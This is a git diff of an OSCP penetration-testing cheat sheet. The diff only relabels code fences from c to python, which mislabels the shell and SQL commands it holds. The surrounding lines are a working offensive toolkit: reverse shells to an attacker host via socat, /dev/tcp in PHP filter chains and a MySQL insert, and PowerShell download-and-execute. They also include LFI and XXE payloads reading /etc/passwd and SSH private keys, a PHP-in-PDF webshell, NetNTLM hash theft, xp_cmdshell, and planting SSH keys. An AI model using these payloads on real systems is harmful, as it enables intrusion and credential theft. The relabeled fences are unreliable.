@@ -486,7 +486,7 @@ Commands, Payloads and Resources for the OffSec Certified Professional Certifica
 
 #### curl
 
-```c
+```python
 curl -v http://<DOMAIN>                                                        // verbose output
 curl -X POST http://<DOMAIN>                                                   // use POST method
 curl -X PUT http://<DOMAIN>                                                    // use PUT method
@@ -500,14 +500,14 @@ curl$\{IFS}<LHOST>/<FILE>                                                       
 
 ##### Reverse Pivot
 
-```c
+```python
 ./chisel server -p 9002 -reverse -v
 ./chisel client <LHOST>:9002 R:3000:127.0.0.1:3000
 ```
 
 ##### SOCKS5 / Proxychains Configuration
 
-```c
+```python
 ./chisel server -p 9002 -reverse -v
 ./chisel client <LHOST>:9002 R:socks
 ```
@@ -516,20 +516,20 @@ curl$\{IFS}<LHOST>/<FILE>                                                       
 
 ##### Certutil
 
-```c
+```python
 certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>
 ```
 
 ##### Netcat
 
-```c
+```python
 nc -lnvp <LPORT> < <FILE>
 nc <RHOST> <RPORT> > <FILE>
 ```
 
 ##### Impacket
 
-```c
+```python
 sudo impacket-smbserver <SHARE> ./
 sudo impacket-smbserver <SHARE> . -smb2support
 copy * \\<LHOST>\<SHARE>
@@ -537,7 +537,7 @@ copy * \\<LHOST>\<SHARE>
 
 ##### PowerShell
 
-```c
+```python
 iwr <LHOST>/<FILE> -o <FILE>
 IEX(IWR http://<LHOST>/<FILE>) -UseBasicParsing
 powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfile C:\\temp\\<FILE>
@@ -549,7 +549,7 @@ powershell -command Invoke-WebRequest -Uri http://<LHOST>:<LPORT>/<FILE> -Outfil
 
 Paste directly to the shell.
 
-```c
+```python
 function __wget() \{
     : $\{DEBUG:=0}
     local URL=$1
@@ -582,13 +582,13 @@ function __wget() \{
 }
 ```
 
-```c
+```python
 __wget http://<LHOST>/<FILE>
 ```
 
 ###### curl version
 
-```c
+```python
 function __curl() \{
   read proto server path <<<$(echo $\{1//// })
   DOC=/$\{path// //}
@@ -605,30 +605,30 @@ function __curl() \{
 }
 ```
 
-```c
+```python
 __curl http://<LHOST>/<FILE> > <OUTPUT_FILE>
 ```
 
 #### FTP
 
-```c
+```python
 ftp <RHOST>
 wget -r ftp://anonymous:anonymous@<RHOST>
 ```
 
 #### Kerberos
 
-```c
+```python
 sudo apt-get install krb5-kdc
 ```
 
-```c
+```python
 impacket-getTGT <DOMAIN>/<USERNAME>:'<PASSWORD>'
 export KRB5CCNAME=<FILE>.ccache
 export KRB5CCNAME='realpath <FILE>.ccache'
 ```
 
-```c
+```python
 /etc/krb5.conf                   // kerberos configuration file location
 kinit <USERNAME>                 // creating ticket request
 klist                            // show available kerberos tickets
@@ -648,48 +648,48 @@ kadmin -p kadmin/<EMAIL> -k -t /etc/krb5.keytab    // enables editing of the key
 
 ##### Download Proxy and Agent
 
-```c
+```python
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
 ```
 
 ##### Prepare Tunnel Interface
 
-```c
+```python
 sudo ip tuntap add user $(whoami) mode tun ligolo
 ```
 
-```c
+```python
 sudo ip link set ligolo up
 ```
 
 ##### Setup Proxy on Attacker Machine
 
-```c
+```python
 ./proxy -laddr <LHOST>:443 -selfcert
 ```
 
 ##### Setup Agent on Target Machine
 
-```c
+```python
 ./agent -connect <LHOST>:443 -ignore-cert
 ```
 
 ##### Session
 
-```c
+```python
 ligolo-ng » session
 ```
 
-```c
+```python
 [Agent : user@target] » ifconfig
 ```
 
-```c
+```python
 sudo ip r add 172.16.1.0/24 dev ligolo
 ```
 
-```c
+```python
 [Agent : user@target] » start
 ```
 
@@ -697,19 +697,19 @@ sudo ip r add 172.16.1.0/24 dev ligolo
 
 ##### CentOS
 
-```c
+```python
 doas -u <USERNAME> /bin/sh
 ```
 
 ##### Environment Variables
 
-```c
+```python
 export PATH=`pwd`:$PATH
 ```
 
 ##### gcc
 
-```c
+```python
 gcc (--static) -m32 -Wl,--hash-style=both exploit.c -o exploit
 i686-w64-mingw32-gcc -o main32.exe main.c
 x86_64-w64-mingw32-gcc -o main64.exe main.c
@@ -717,13 +717,13 @@ x86_64-w64-mingw32-gcc -o main64.exe main.c
 
 ##### getfacl
 
-```c
+```python
 getfacl <LOCAL_DIRECTORY>
 ```
 
 ##### iconv
 
-```c
+```python
 echo "<COMMAND>" | iconv -t UTF-16LE | base64 -w 0
 echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
@@ -731,13 +731,13 @@ iconv -f ASCII -t UTF-16LE <FILE>.txt | base64 | tr -d "\n"
 
 ##### vi
 
-```c
+```python
 :w !sudo tee %    # save file with elevated privileges without exiting
 ```
 
 ##### Windows Command Formatting
 
-```c
+```python
 echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 ```
 
@@ -745,34 +745,34 @@ echo "<COMMAND>" | iconv -f UTF-8 -t UTF-16LE | base64 -w0
 
 ##### dir
 
-```c
+```python
 dir flag* /s /p
 dir /s /b *.log
 ```
 
 #### PHP Webserver
 
-```c
+```python
 sudo php -S 127.0.0.1:80
 ```
 
 #### Ping
 
-```c
+```python
 ping -c 1 <RHOST>
 ping -n 1 <RHOST>
 ```
 
 #### Python Webserver
 
-```c
+```python
 sudo python -m SimpleHTTPServer 80
 sudo python3 -m http.server 80
 ```
 
 #### RDP
 
-```c
+```python
 xfreerdp /v:<RHOST> /u:<USERNAME> /p:<PASSWORD> /dynamic-resolution +clipboard
 xfreerdp /v:<RHOST> /u:<USERNAME> /d:<DOMAIN> /pth:'<HASH>' /dynamic-resolution +clipboard
 rdesktop <RHOST>
@@ -780,7 +780,7 @@ rdesktop <RHOST>
 
 #### showmount
 
-```c
+```python
 /usr/sbin/showmount -e <RHOST>
 sudo showmount -e <RHOST>
 chown root:root sid-shell; chmod +s sid-shell
@@ -788,7 +788,7 @@ chown root:root sid-shell; chmod +s sid-shell
 
 #### smbclient
 
-```c
+```python
 smbclient -L \\<RHOST>\ -N
 smbclient -L //<RHOST>/ -N
 smbclient -L ////<RHOST>/ -N
@@ -804,7 +804,7 @@ guestmount --add '/<MOUNTPOINT>/<DIRECTORY/FILE>' --inspector --ro /mnt/<MOUNT> 
 
 ##### Download multiple files at once
 
-```c
+```python
 mask""
 recurse ON
 prompt OFF
@@ -813,7 +813,7 @@ mget *
 
 ##### Upload multiple Files at once
 
-```c
+```python
 recurse ON
 prompt OFF
 mput *
@@ -821,23 +821,23 @@ mput *
 
 #### socat
 
-```c
+```python
 socat TCP-LISTEN:<LPORT>,fork TCP:<RHOST>:<RPORT>
 ```
 
-```c
+```python
 socat file:`tty`,raw,echo=0 tcp-listen:<LPORT>
 socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:<LHOST>:<LPORT>
 ```
 
-```c
+```python
 socat tcp-listen:5986,reuseaddr,fork tcp:<RHOST>:9002
 socat tcp-listen:9002,reuseaddr,fork tcp:192.168.122.228:5968 &
 ```
 
 #### SSH
 
-```c
+```python
 ssh user@<RHOST> -oKexAlgorithms=+diffie-hellman-group1-sha1
 
 ssh -R 8080:<LHOST>:80 <RHOST>
@@ -853,31 +853,31 @@ ssh -L 80:localhost:80 <RHOST>
 
 ##### Get the Server Time
 
-```c
+```python
 sudo nmap -sU -p 123 --script ntp-info <RHOST>
 ```
 
 ##### Stop virtualbox-guest-utils to stop syncing Time
 
-```c
+```python
 sudo /etc/init.d/virtualbox-guest-utils stop
 ```
 
 ##### Stop systemd-timesyncd to sync Time manually
 
-```c
+```python
 sudo systemctl stop systemd-timesyncd
 ```
 
 ##### Disable automatic Sync
 
-```c
+```python
 sudo systemctl disable --now chronyd
 ```
 
 ##### Options to set the Date and Time
 
-```c
+```python
 sudo net time -c <RHOST>
 sudo net time set -S <RHOST>
 sudo net time \\<RHOST> /set /y
@@ -894,13 +894,13 @@ sudo timedatectl set-local-rtc 1
 
 ##### Keep in Sync with a Server
 
-```c
+```python
 while [ 1 ]; do sudo ntpdate <RHOST>;done
 ```
 
 #### Tmux
 
-```c
+```python
 ctrl b + w    # show windows
 ctrl + "      # split window horizontal
 ctrl + %      # split window vertical
@@ -911,7 +911,7 @@ ctrl + spacebar    # switch pane layout
 ```
 
 Copy & Paste
-```c
+```python
 :setw -g mode-keys vi
 ctrl b + [
 space
@@ -920,7 +920,7 @@ ctrl b + ]
 ```
 
 Search
-```c
+```python
 ctrl b + [    # enter copy
 ctrl + /      # enter search while within copy mode for vi mode
 n             # search next
@@ -928,13 +928,13 @@ shift + n     # reverse search
 ```
 
 Logging
-```c
+```python
 ctrl b
 shift + P    # start / stop
 ```
 
 Save Output
-```c
+```python
 ctrl b + :
 capture-pane -S -
 ctrl b + :
@@ -943,7 +943,7 @@ save-buffer <FILE>.txt
 
 #### Upgrading Shells
 
-```c
+```python
 python -c 'import pty;pty.spawn("/bin/bash")'
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
@@ -957,44 +957,44 @@ export XTERM=xterm
 
 Alternatively:
 
-```c
+```python
 script -q /dev/null -c bash
 /usr/bin/script -qc /bin/bash /dev/null
 ```
 
 ### Oneliner
 
-```c
+```python
 stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
 ```
 
 #### Fixing Staircase Effect
 
-```c
+```python
 env reset
 ```
 
 or
 
-```c
+```python
 stty onlcr
 ```
 
 #### VirtualBox
 
-```c
+```python
 sudo pkill VBoxClient && VBoxClient --clipboard
 ```
 
 #### virtualenv
 
-```c
+```python
 sudo apt-get install virtualenv
 virtualenv -p python2.7 venv
 . venv/bin/activate
 ```
 
-```c
+```python
 python.exe -m pip install virtualenv
 python.exe -m virtualenv venv
 venv\Scripts\activate
@@ -1006,7 +1006,7 @@ venv\Scripts\activate
 
 >  https://github.com/pd4d10/memcached-cli
 
-```c
+```python
 memcrashed / 11211/UDP
 
 npm install -g memcached-cli
@@ -1032,14 +1032,14 @@ get password
 
 #### NetBIOS
 
-```c
+```python
 nbtscan <RHOST>
 nmblookup -A <RHOST>
 ```
 
 #### Nmap
 
-```c
+```python
 sudo nmap -A -T4 -sC -sV -p- <RHOST>
 sudo nmap -sV -sU <RHOST>
 sudo nmap -A -T4 -sC -sV --script vuln <RHOST>
@@ -1052,17 +1052,17 @@ locate -r '\.nse$' | xargs grep categories | grep categories | grep 'default\|ve
 
 #### Port Scanning
 
-```c
+```python
 for p in \{1..65535}; do nc -vn <RHOST> $p -w 1 -z & done 2> <FILE>.txt
 ```
 
-```c
+```python
 export ip=<RHOST>; for port in $(seq 1 65535); do timeout 0.01 bash -c "</dev/tcp/$ip/$port && echo The port $port is open || echo The Port $port is closed > /dev/null" 2>/dev/null || echo Connection Timeout > /dev/null; done
 ```
 
 #### snmpwalk
 
-```c
+```python
 snmpwalk -c public -v1 <RHOST>
 snmpwalk -v2c -c public <RHOST> 1.3.6.1.2.1.4.34.1.3
 snmpwalk -v2c -c public <RHOST> .1
@@ -1080,7 +1080,7 @@ snmpwalk -c public -v1 <RHOST> 1.3.6.1.2.1.25.6.3.1.2
 
 #### Burp Suite
 
-```c
+```python
 Ctrl+r          // Sending request to repeater
 Ctrl+i          // Sending request to intruder
 Ctrl+Shift+b    // base64 encoding
@@ -1089,18 +1089,18 @@ Ctrl+Shift+u    // URL decoding
 
 #### Set Proxy Environment Variables
 
-```c
+```python
 export HTTP_PROXY=http://localhost:8080
 export HTTPS_PROXY=https://localhost:8080
 ```
 
 #### cadaver
 
-```c
+```python
 cadaver http://<RHOST>/<WEBDAV_DIRECTORY>/
 ```
 
-```c
+```python
 dav:/<WEBDAV_DIRECTORY>/> cd C
 dav:/<WEBDAV_DIRECTORY>/C/> ls
 dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
@@ -1108,7 +1108,7 @@ dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 
 #### Cross-Site Scripting (XSS)
 
-```c
+```python
 <sCrIpt>alert(1)</ScRipt>
 <script>alert('XSS');</script>
 <script>alert(document.cookies)</script>
@@ -1121,7 +1121,7 @@ dav:/<WEBDAV_DIRECTORY>/C/> put <FILE>
 
 #### ffuf
 
-```c
+```python
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fs <NUMBER> -mc all
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ --fw <NUMBER> -mc all
 ffuf -w /usr/share/wordlists/dirb/common.txt -u http://<RHOST>/FUZZ -mc 200,204,301,302,307,401 -o results.txt
@@ -1131,62 +1131,62 @@ ffuf -c -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt -u http:
 
 ##### API Fuzzing
 
-```c
+```python
 ffuf -u https://<RHOST>/api/v2/FUZZ -w api_seen_in_wild.txt -c -ac -t 250 -fc 400,404,412
 ```
 
 ##### Searching for LFI
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -u http://<RHOST>/admin../admin_staging/index.php?page=FUZZ -fs 15349
 ```
 
 ##### Fuzzing with PHP Session ID
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-small.txt  -u "http://<RHOST>/admin/FUZZ.php" -b "PHPSESSID=a0mjo6ukbkq271nb2rkb1joamp" -fw 2644
 ```
 
 ##### Recursion
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/basic/FUZZ -recursion
 ```
 
 ##### File Extensions
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://<RHOST>/cd/ext/logs/FUZZ -e .log
 ```
 
 ##### Rate Limiting
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -t 5 -p 0.1 -u http://<RHOST>/cd/rate/FUZZ -mc 200,429
 ```
 
 ##### Virtual Host Discovery
 
-```c
+```python
 ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -fs 1495
 ```
 
 ##### Massive File Extension Discovery
 
-```c
+```python
 ffuf -w /opt/seclists/Discovery/Web-Content/directory-list-1.0.txt -u http://<RHOST>/FUZZ -t 30 -c -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -mc 200,204,301,302,307,401,403,500 -ic -e .7z,.action,.ashx,.asp,.aspx,.backup,.bak,.bz,.c,.cgi,.conf,.config,.dat,.db,.dhtml,.do,.doc,.docm,.docx,.dot,.dotm,.go,.htm,.html,.ini,.jar,.java,.js,.js.map,.json,.jsp,.jsp.source,.jspx,.jsx,.log,.old,.pdb,.pdf,.phtm,.phtml,.pl,.py,.pyc,.pyz,.rar,.rhtml,.shtm,.shtml,.sql,.sqlite3,.svc,.tar,.tar.bz2,.tar.gz,.tsx,.txt,.wsdl,.xhtm,.xhtml,.xls,.xlsm,.xlst,.xlsx,.xltm,.xml,.zip
 ```
 
 #### GitTools
 
-```c
+```python
 ./gitdumper.sh http://<RHOST>/.git/ /PATH/TO/FOLDER
 ./extractor.sh /PATH/TO/FOLDER/ /PATH/TO/FOLDER/
 ```
 
 #### Gobuster
 
-```c
+```python
 -e    // extended mode that renders the full url
 -k    // skip ssl certificate validation
 -r    // follow cedirects
@@ -1203,65 +1203,65 @@ $ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-
 
 ##### Common File Extensions
 
-```c
+```python
 txt,bak,php,html,js,asp,aspx
 ```
 
 ##### Common Picture Extensions
 
-```c
+```python
 png,jpg,jpeg,gif,bmp
 ```
 
 ##### POST Requests
 
-```c
+```python
 gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://<RHOST>/api/ -e -s 200
 ```
 
 ##### DNS Recon
 
-```c
+```python
 gobuster dns -d <RHOST> -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 gobuster dns -d <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 ```
 
 ##### VHost Discovery
 
-```c
+```python
 gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt
 gobuster vhost -u <RHOST> -t 50 -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
 ```
 
 ##### Specifiy User Agent
 
-```c
+```python
 gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://<RHOST>/ -a Linux
 ```
 
 #### Local File Inclusion (LFI)
 
-```c
+```python
 http://<RHOST>/<FILE>.php?file=
 http://<RHOST>/<FILE>.php?file=../../../../../../../../etc/passwd
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd
 ```
 ##### Until php 5.3
 
-```c
+```python
 http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 ```
 
 ##### Null Byte
 
-```c
+```python
 %00
 0x00
 ```
 
 ##### Encoded Traversal Strings
 
-```c
+```python
 ../
 ..\
 ..\/
@@ -1282,11 +1282,11 @@ http://<RHOST>/<FILE>/php?file=../../../../../../../../../../etc/passwd%00
 
 > https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion#wrapper-phpfilter
 
-```c
+```python
 url=php://filter/convert.base64-encode/resource=file:////var/www/<RHOST>/api.php
 ```
 
-```c
+```python
 http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=index
 http://<RHOST>/index.php?page=php://filter/convert.base64-encode/resource=/etc/passwd
 base64 -d <FILE>.php
@@ -1294,7 +1294,7 @@ base64 -d <FILE>.php
 
 ##### Django, Rails, or Node.js Web Application Header Values
 
-```c
+```python
 Accept: ../../../../.././../../../../etc/passwd\{\{
 Accept: ../../../../.././../../../../etc/passwd\{%0D
 Accept: ../../../../.././../../../../etc/passwd\{%0A
@@ -1306,7 +1306,7 @@ Accept: ../../../../.././../../../../etc/passwd\{%00\{\{
 
 ##### Linux Files
 
-```c
+```python
 /etc/passwd
 /etc/shadow
 /etc/aliases
@@ -1583,7 +1583,7 @@ Accept: ../../../../.././../../../../etc/passwd\{%00\{\{
 
 ##### Windows Files
 
-```c
+```python
 C:/Users/Administrator/NTUser.dat
 C:/Documents and Settings/Administrator/NTUser.dat
 C:/apache/logs/access.log
@@ -1658,7 +1658,7 @@ C:/inetpub/logs/LogFiles/W3SVC1/u_ex[YYMMDD].log
 
 Create a file with a PDF header, which contains PHP code.
 
-```c
+```python
 %PDF-1.4
 
 <?php
@@ -1666,13 +1666,13 @@ Create a file with a PDF header, which contains PHP code.
 ?>
 ```
 
-```c
+```python
 http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 ```
 
 #### PHP Upload Filter Bypasses
 
-```c
+```python
 .sh
 .cgi
 .inc
@@ -1695,7 +1695,7 @@ http://<RHOST>/index.php?page=uploads/<FILE>.pdf%00&cmd=whoami
 .php%00.jpeg
 ```
 
-```c
+```python
 <FILE>.php%20
 <FILE>.php%0d%0a.jpg
 <FILE>.php%0a
@@ -1713,7 +1713,7 @@ mv <FILE>.jpg <FILE>.php\x00.jpg
 
 > https://github.com/synacktiv/php_filter_chain_generator
 
-```c
+```python
 python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 python3 php_filter_chain_generator.py --chain "<?php echo shell_exec(id); ?>"
 python3 php_filter_chain_generator.py --chain """<?php echo shell_exec(id); ?>"""
@@ -1721,11 +1721,11 @@ python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bas
 python3 php_filter_chain_generator.py --chain """"<?php exec(""/bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'"");?>""""
 ```
 
-```c
+```python
 http://<RHOST>/?page=php://filter/convert.base64-decode/resource=PD9waHAgZWNobyBzaGVsbF9leGVjKGlkKTsgPz4
 ```
 
-```c
+```python
 python3 php_filter_chain_generator.py --chain '<?= exec($_GET[0]); ?>'
 [+] The following gadget chain will generate the following code : <?= exec($_GET[0]); ?> (base64 value: PD89IGV4ZWMoJF9HRVRbMF0pOyA/Pg)
 php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&0=<COMMAND>
@@ -1733,13 +1733,13 @@ php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|<--- SNIP --->
 
 #### PHP Generic Gadget Chains (PHPGGC)
 
-```c
+```python
 phpggc -u --fast-destruct Guzzle/FW1 /dev/shm/<FILE>.txt /PATH/TO/FILE/<FILE>.txt
 ```
 
 #### Server-Side Request Forgery (SSRF)
 
-```c
+```python
 https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 ```
 
@@ -1749,7 +1749,7 @@ https://<RHOST>/item/2?server=server.<RHOST>/file?id=9&x=
 
 > https://cobalt.io/blog/a-pentesters-guide-to-server-side-template-injection-ssti
 
-```c
+```python
 $\{\{<%[%'"}}%\.
 ```
 
@@ -1757,13 +1757,13 @@ $\{\{<%[%'"}}%\.
 
 > https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee
 
-```c
+```python
 \{\{ ‘’.__class__.__mro__[1].__subclasses__() }}
 ```
 
 #### Upload Vulnerabilities
 
-```c
+```python
 ASP / ASPX / PHP / PHP3 / PHP5: Webshell / Remote Code Execution
 SVG: Stored XSS / Server-Side Request Forgery
 GIF: Stored XSS
@@ -1778,61 +1778,61 @@ PDF / PPTX: Server-Side Request Forgery / Blind XXE
 
 #### wfuzz
 
-```c
+```python
 wfuzz -w /usr/share/wfuzz/wordlist/general/big.txt -u http://<RHOST>/FUZZ/<FILE>.php --hc '403,404'
 ```
 
 ##### Write to File
 
-```c
+```python
 wfuzz -w /PATH/TO/WORDLIST -c -f <FILE> -u http://<RHOST> --hc 403,404
 ```
 
 ##### Custom Scan with limited Output
 
-```c
+```python
 wfuzz -w /PATH/TO/WORDLIST -u http://<RHOST>/dev/304c0c90fbc6520610abbf378e2339d1/db/file_FUZZ.txt --sc 200 -t 20
 ```
 
 ##### Fuzzing two Parameters at once
 
-```c
+```python
 wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -u http://<RHOST>:/<directory>/FUZZ.FUZ2Z -z list,txt-php --hc 403,404 -c
 ```
 
 ##### Domain
 
-```c
+```python
 wfuzz --hh 0 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.<RHOST>' -u http://<RHOST>/
 ```
 
 ##### Subdomain
 
-```c
+```python
 wfuzz -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.<RHOST>" --hc 200 --hw 356 -t 100 <RHOST>
 ```
 
 ##### Git
 
-```c
+```python
 wfuzz -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt -u http://<RHOST>/FUZZ --hc 403,404
 ```
 ##### Login
 
-```c
+```python
 wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "email=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --hc 200 -c
 wfuzz -X POST -u "http://<RHOST>:<RPORT>/login.php" -d "username=FUZZ&password=<PASSWORD>" -w /PATH/TO/WORDLIST/<WORDLIST>.txt --ss "Invalid login"
 ```
 
 ##### SQL
 
-```c
+```python
 wfuzz -c -z file,/usr/share/wordlists/seclists/Fuzzing/SQLi/Generic-SQLi.txt -d 'db=FUZZ' --hl 16 http://<RHOST>/select http
 ```
 
 ##### DNS
 
-```c
+```python
 wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Origin: http://FUZZ.<RHOST>" --filter "r.headers.response~'Access-Control-Allow-Origin'" http://<RHOST>/
 wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,404,403 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> -t 100
 wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-110000.txt --hc 400,403,404 -H "Host: FUZZ.<RHOST>" -u http://<RHOST> --hw <value> -t 100
@@ -1840,19 +1840,19 @@ wfuzz -c -w /usr/share/wordlists/secLists/Discovery/DNS/subdomains-top1million-1
 
 ##### Numbering Files
 
-```c
+```python
 wfuzz -w /usr/share/wordlists/seclists/Fuzzing/4-digits-0000-9999.txt --hw 31 http://10.13.37.11/backups/backup_2021052315FUZZ.zip
 ```
 
 ##### Enumerating PIDs
 
-```c
+```python
 wfuzz -u 'http://backdoor.htb/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=/proc/FUZZ/cmdline' -z range,900-1000
 ```
 
 #### WPScan
 
-```c
+```python
 wpscan --url https://<RHOST> --enumerate u,t,p
 wpscan --url https://<RHOST> --plugins-detection aggressive
 wpscan --url https://<RHOST> --disable-tls-checks
@@ -1864,7 +1864,7 @@ wpscan --url http://<RHOST> -U <USERNAME> -P passwords.txt -t 50
 
 ##### Skeleton Payload Request
 
-```c
+```python
 GET / HTTP/1.1
 Host: <RHOST>:<RPORT>
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
@@ -1880,16 +1880,16 @@ Content-Length: 136
 
 ##### Payloads
 
-```c
+```python
 <?xml version="1.0" encoding="UTF-8"?><!DOCTYPE xxe [ <!ENTITY passwd SYSTEM 'file:///etc/passwd'> ]>
  <stockCheck><productId>&passwd;</productId><storeId>1</storeId></stockCheck>
 ```
 
-```c
+```python
 <?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///c:/windows/win.ini'>]><order><quantity>3</quantity><item>&test;</item><address>17th Estate, CA</address></order>
 ```
 
-```c
+```python
 username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+SYSTEM+"/root/.ssh/id_rsa">+]><!--
 ```
 
@@ -1897,11 +1897,11 @@ username=%26username%3b&version=1.0.0--><!DOCTYPE+username+[+<!ENTITY+username+S
 
 #### MongoDB
 
-```c
+```python
 mongo "mongodb://localhost:27017"
 ```
 
-```c
+```python
 > use <DATABASE>;
 > show tables;
 > show collections;
@@ -1916,7 +1916,7 @@ mongo "mongodb://localhost:27017"
 
 ##### User Password Reset to "12345"
 
-```c
+```python
 > db.getCollection('users').update(\{username:"admin"}, \{ $set: \{"services" : \{ "password" : \{"bcrypt" : "$2a$10$n9CM8OgInDlwpvjLKLPML.eizXIzLlRtgCh3GRLafOdR9ldAUh/KG" } } } })
 ```
 
@@ -1924,44 +1924,44 @@ mongo "mongodb://localhost:27017"
 
 ##### Show Database Content
 
-```c
+```python
 1> SELECT name FROM master.sys.databases
 2> go
 ```
 
 ##### OPENQUERY
 
-```c
+```python
 1> select * from openquery("web\clients", 'select name from master.sys.databases');
 2> go
 ```
 
-```c
+```python
 1> select * from openquery("web\clients", 'select name from clients.sys.objects');
 2> go
 ```
 
 ##### Binary Extraction as Base64
 
-```c
+```python
 1> select cast((select content from openquery([web\clients], 'select * from clients.sys.assembly_files') where assembly_id = 65536) as varbinary(max)) for xml path(''), binary base64;
 2> go > export.txt
 ```
 
 ##### Steal NetNTLM Hash / Relay Attack
 
-```c
+```python
 SQL> exec master.dbo.xp_dirtree '\\<LHOST>\FOOBAR'
 ```
 
 #### MySQL
 
-```c
+```python
 mysql -u root -p
 mysql -u <USERNAME> -h <RHOST> -p
 ```
 
-```c
+```python
 mysql> show databases;
 mysql> use <DATABASE>;
 mysql> show tables;
@@ -1973,19 +1973,19 @@ mysql> SELECT Username,Password FROM Users;
 
 ##### Update User Password
 
-```c
+```python
 mysql> update user set password = '37b08599d3f323491a66feabbb5b26af' where user_id = 1;
 ```
 
 ##### Drop a Shell
 
-```c
+```python
 mysql> \! /bin/sh
 ```
 
 ##### xp_cmdshell
 
-```c
+```python
 SQL> EXEC sp_configure 'Show Advanced Options', 1;
 SQL> reconfigure;
 SQL> sp_configure;
@@ -1994,26 +1994,26 @@ SQL> reconfigure
 SQL> xp_cmdshell "whoami"
 ```
 
-```c
+```python
 SQL> enable_xp_cmdshell
 SQL> xp_cmdshell whoami
 ```
 
 ##### Insert Code to get executed
 
-```c
+```python
 mysql> insert into users (id, email) values (<LPORT>, "- E $(bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1')");
 ```
 
 ##### Write SSH Key into authorized_keys2 file
 
-```c
+```python
 mysql> SELECT "<KEY>" INTO OUTFILE '/root/.ssh/authorized_keys2' FIELDS TERMINATED BY '' OPTIONALLY ENCLOSED BY '' LINES TERMINATED BY '\n';
 ```
 
 ##### Linked SQL Server Enumeration
 
-```c
+```python
 SQL> SELECT user_name();
 SQL> SELECT name,sysadmin FROM syslogins;
 SQL> SELECT srvname,isremote FROM sysservers;
@@ -2024,14 +2024,14 @@ SQL> EXEC ('EXEC (''SELECT suser_name()'') at [<DOMAIN>\<CONFIG_FILE>]') at [<DO
 
 #### NoSQL Injection
 
-```c
+```python
 admin'||''==='
 \{"username": \{"$ne": null}, "password": \{"$ne": null} }
 ```
 
 #### PostgreSQL
 
-```c
+```python
 psql
